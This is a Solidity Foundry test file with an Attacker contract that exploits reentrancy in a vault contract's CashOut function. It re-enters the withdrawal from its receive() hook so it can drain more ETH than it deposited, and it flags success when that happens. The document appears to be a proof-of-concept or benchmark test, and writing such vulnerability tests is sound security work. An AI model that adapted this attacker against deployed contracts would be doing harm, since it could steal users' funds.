
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT_2.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to deposit first to have a balance to withdraw

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit to create a balance in the victim contract
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // 2. Call the vulnerable function
        victim.CashOut(val);

        // 3. Verify Success Conditions
        // If we received more than we should have (due to reentrancy), exploit succeeded
        uint256 finalBalance = address(this).balance;
        if (finalBalance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
        // Also check if we called multiple times
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the contract - the balance hasn't been updated yet
            // so we can withdraw again
            if (address(victim).balance >= storedAttackVal) {
                victim.CashOut(storedAttackVal);
            }
        }
    }
}
